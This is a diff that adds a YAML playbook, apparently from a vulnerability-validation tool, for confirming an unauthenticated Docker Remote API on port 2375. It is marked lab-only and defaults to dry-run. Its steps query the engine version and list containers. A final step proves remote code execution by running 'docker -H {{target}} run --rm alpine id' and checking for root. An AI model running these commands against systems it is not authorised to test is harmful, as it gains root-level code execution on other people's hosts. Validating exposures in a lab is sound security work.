@@ -1,0 +1,35 @@
+metadata:
+  name: docker-unauthenticated-api-validation
+  description: >
+    Validate unauthenticated Docker Remote API exposure by executing
+    non-persistent Docker commands (lab-only).
+  author: jordan
+  lab_only: true
+  default_mode: dry-run
+
+requirements:
+  min_confidence: 0.8
+  target_protocol: tcp
+  target_port: 2375
+
+steps:
+  - id: docker_version
+    description: Query Docker engine version
+    command: >
+      docker -H {{target}} version
+    success_criteria:
+      contains: "ApiVersion"
+
+  - id: docker_ps
+    description: List running containers on target
+    command: >
+      docker -H {{target}} ps
+    success_criteria:
+      exit_code: 0
+
+  - id: docker_rce_proof
+    description: Prove remote code execution via ephemeral container
+    command: >
+      docker -H {{target}} run --rm alpine id
+    success_criteria:
+      contains: "uid=0"
